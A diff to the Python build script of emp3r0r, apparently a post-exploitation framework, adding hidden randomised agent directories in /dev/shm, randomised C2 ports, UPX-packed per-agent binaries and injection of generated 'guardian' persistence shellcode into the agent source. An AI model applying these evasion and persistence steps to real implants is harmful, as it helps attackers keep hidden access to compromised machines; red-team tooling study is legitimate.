@@ -10,8 +10,10 @@ import atexit
 import glob
 import json
 import os
+import random
 import readline
 import shutil
+import subprocess
 import sys
 import traceback
 import uuid
@@ -42,13 +44,14 @@ class GoBuild:
         self.CC_OTHER_NAMES = cc_other_names
         self.INDICATOR = cc_indicator
         self.UUID = str(uuid.uuid1())
+        self.VERSION = get_version()
 
         # agent root directory
 
         if "agent_root" in CACHED_CONF:
             self.AgentRoot = CACHED_CONF['agent_root']
         else:
-            self.AgentRoot = f"/dev/shm/.../{uuid.uuid4()}"
+            self.AgentRoot = f"/dev/shm/.{rand_str(random.randint(3, 9))}"
             CACHED_CONF['agent_root'] = self.AgentRoot
 
     def build(self):
@@ -80,18 +83,21 @@ class GoBuild:
             return
 
         log_warn("GO BUILD starts...")
+        build_target = f"../../build/{self.target}"
+        if self.target == "agent":
+            build_target = f"../../build/{self.target}-{self.UUID}"
         # cmd = f'''GOOS={self.GOOS} GOARCH={self.GOARCH}''' + \
         # f''' go build -ldflags='-s -w -extldflags "-static"' -o ../../build/{self.target}'''
         cmd = f'''GOOS={self.GOOS} GOARCH={self.GOARCH} CGO_ENABLED=0''' + \
-            f''' go build -ldflags='-s -w' -o ../../build/{self.target}'''
+            f''' go build -ldflags='-s -w' -o {build_target}'''
         os.system(cmd)
         log_warn("GO BUILD ends...")
 
         os.chdir("../../")
         self.unset_tags()
 
-        if os.path.exists(f"./build/{self.target}"):
-            os.system(f"upx -9 ./build/{self.target}")
+        if os.path.exists(f"./build/{build_target.split('/')[-1]}"):
+            os.system(f"upx -9 ./build/{build_target.split('/')[-1]}")
         else:
             log_error("go build failed")
             sys.exit(1)
@@ -121,36 +127,66 @@ class GoBuild:
     def unset_tags(self):
         '''
         restore tags in the source
-
-        - CA: emp3r0r CA, ./internal/tun/tls.go
-        - CC indicator: check if CC is online, ./internal/agent/def.go
-        - Agent ID: UUID (tag) of our agent, ./internal/agent/def.go
-        - CC IP: IP of CC server, ./internal/agent/def.go
         '''
 
+        # version
+        sed("./internal/agent/def.go",
+            f"Version = \"{self.VERSION}\"", "Version = \"[emp3r0r_version_string]\"")
+        # agent root path
         sed("./internal/agent/def.go",
             self.AgentRoot, "[agent_root]")
+        # CA
         sed("./internal/tun/tls.go", self.CA, "[emp3r0r_ca]")
+        if self.target == "agent":
+            # guardian_shellcode
+            sed("./internal/agent/def.go", f"GuardianShellcode = `{CACHED_CONF['guardian_shellcode']}`",
+                "GuardianShellcode = `[persistence_shellcode]`")
+            sed("./internal/agent/def.go", f"GuardianAgentPath = \"{CACHED_CONF['guardian_agent_path']}\"",
+                "GuardianAgentPath = \"[persistence_agent_path]\"")
+        # cc indicator
         sed("./internal/agent/def.go", self.INDICATOR, "[cc_indicator]")
         # in case we use the same IP for indicator and CC
         sed("./internal/agent/def.go", self.CCIP, "[cc_ipaddr]")
         sed("./internal/agent/def.go", self.UUID, "[agent_uuid]")
+        # restore ports
+        sed("./internal/agent/def.go",
+            f"CCPort = \"{CACHED_CONF['cc_port']}\"", "CCPort = \"[cc_port]\"")
+        sed("./internal/agent/def.go",
+            f"ProxyPort = \"{CACHED_CONF['proxy_port']}\"", "ProxyPort = \"[proxy_port]\"")
+        sed("./internal/agent/def.go",
+            f"BroadcastPort = \"{CACHED_CONF['broadcast_port']}\"", "BroadcastPort = \"[broadcast_port]\"")
 
     def set_tags(self):
         '''
         modify some tags in the source
-
-        - CA: emp3r0r CA, ./internal/tun/tls.go
-        - CC indicator: check if CC is online, ./internal/agent/def.go
-        - Agent ID: UUID (tag) of our agent, ./internal/agent/def.go
-        - CC IP: IP of CC server, ./internal/agent/def.go
         '''
 
+        # version
+        sed("./internal/agent/def.go",
+            "Version = \"[emp3r0r_version_string]\"", f"Version = \"{self.VERSION}\"")
+        if self.target == "agent":
+            # guardian shellcode
+            sed("./internal/agent/def.go",
+                "[persistence_shellcode]", CACHED_CONF['guardian_shellcode'])
+            sed("./internal/agent/def.go",
+                "[persistence_agent_path]", CACHED_CONF['guardian_agent_path'])
+        # CA
         sed("./internal/tun/tls.go", "[emp3r0r_ca]", self.CA)
+        # CC IP
         sed("./internal/agent/def.go", "[cc_ipaddr]", self.CCIP)
+        # agent root path
         sed("./internal/agent/def.go", "[agent_root]", self.AgentRoot)
+        # indicator
         sed("./internal/agent/def.go", "[cc_indicator]", self.INDICATOR)
+        # agent UUID
         sed("./internal/agent/def.go", "[agent_uuid]", self.UUID)
+        # ports
+        sed("./internal/agent/def.go",
+            "[cc_port]", CACHED_CONF['cc_port'])
+        sed("./internal/agent/def.go",
+            "[proxy_port]", CACHED_CONF['proxy_port'])
+        sed("./internal/agent/def.go",
+            "[broadcast_port]", CACHED_CONF['broadcast_port'])
 
 
 def clean():
@@ -163,6 +199,7 @@ def clean():
     for f in to_rm:
         try:
             # remove directories too
+
             if os.path.isdir(f):
                 os.removedirs(f)
             else:
@@ -190,8 +227,10 @@ def yes_no(prompt):
     '''
     y/n?
     '''
+
     if yes_to_all:
         log_warn(f"Choosing 'yes' for '{prompt}'")
+
         return True
 
     answ = input(prompt + " [Y/n] ").lower().strip()
@@ -200,6 +239,20 @@ def yes_no(prompt):
         return False
 
     return True
+
+
+def rand_str(length):
+    '''
+    random string
+    '''
+    uuidstr = str(uuid.uuid4()).replace('-', '')
+
+    # we don't want the string to be long
+
+    if length >= len(uuidstr):
+        return uuidstr
+
+    return uuidstr[:length]
 
 
 def main(target):
@@ -255,6 +308,21 @@ def main(target):
         indicator = input("CC status indicator: ").strip()
         CACHED_CONF['cc_indicator'] = indicator
 
+    # guardian shellcode
+
+    use_cached = False
+
+    if "guardian_shellcode" in CACHED_CONF and "guardian_agent_path" in CACHED_CONF:
+        guardian_shellcode = CACHED_CONF['guardian_shellcode']
+        guardian_agent_path = CACHED_CONF['guardian_agent_path']
+        use_cached = yes_no(
+            f"Use cached {len(guardian_shellcode)} bytes of guardian shellcode ({guardian_agent_path})?")
+
+    if not use_cached:
+        path = input("Agent path for guardian shellcode: ").strip()
+        CACHED_CONF['guardian_shellcode'] = gen_guardian_shellcode(path)
+        CACHED_CONF['guardian_agent_path'] = path
+
     gobuild = GoBuild(target="agent", cc_indicator=indicator, cc_ip=ccip)
     gobuild.build()
 
@@ -285,6 +353,7 @@ def save(prev_h_len, hfile):
 # JSON config file, cache some user data
 BUILD_JSON = "./build/build.json"
 CACHED_CONF = {}
+
 if os.path.exists(BUILD_JSON):
     try:
         jsonf = open(BUILD_JSON)
@@ -294,8 +363,86 @@ if os.path.exists(BUILD_JSON):
         log_warn(traceback.format_exc())
 
 
+def rand_port():
+    '''
+    returns a random int between 1024 and 65535
+    '''
+
+    return str(random.randint(1025, 65534))
+
+
+def randomize_ports():
+    '''
+    randomize every port used by emp3r0r agent,
+    cache them in build.json
+    '''
+
+    if 'cc_port' not in CACHED_CONF:
+        CACHED_CONF['cc_port'] = rand_port()
+
+    if 'proxy_port' not in CACHED_CONF:
+        CACHED_CONF['proxy_port'] = rand_port()
+
+    if 'broadcast_port' not in CACHED_CONF:
+        CACHED_CONF['broadcast_port'] = rand_port()
+
+
+def gen_guardian_shellcode(path):
+    '''
+    ../shellcode/gen.py
+    '''
+    try:
+        pwd = os.getcwd()
+        os.chdir("../shellcode")
+        out = subprocess.check_output(["python3", "gen.py", path])
+        os.chdir(pwd)
+
+        shellcode = out.decode('utf-8')
+
+        if "Failed" in shellcode:
+            log_error("Failed to generate shellcode: "+out)
+
+            return "N/A"
+    except BaseException:
+        log_error(traceback.format_exc())
+
+        return "N/A"
+
+    return shellcode
+
+
+def get_version():
+    '''
+    print current version
+    '''
+    try:
+        check = "git describe --tags"
+        out = subprocess.check_output(
+            ["/bin/sh", "-c", check],
+            stderr=subprocess.STDOUT, timeout=3)
+    except KeyboardInterrupt:
+        return "Unknown"
+    except BaseException:
+        check = "git describe --always"
+        try:
+            out = subprocess.check_output(
+                ["/bin/sh", "-c", check],
+                stderr=subprocess.STDOUT, timeout=3)
+        except BaseException:
+            try:
+                versionf = open(".version")
+                version = versionf.read().strip()
+                versionf.close()
+                return version
+            except BaseException:
+                return "Unknown"
+
+    return out.decode("utf-8").strip()
+
+
 # command line args
 yes_to_all = False
+
 if len(sys.argv) < 2:
     print(f"python3 {sys.argv[0]} cc/agent [-y]")
     sys.exit(1)
@@ -304,6 +451,8 @@ elif len(sys.argv) == 3:
     yes_to_all = sys.argv[2] == "-y"
 
 try:
+    randomize_ports()
+
     if not os.path.exists("./build"):
         os.mkdir("./build")
 
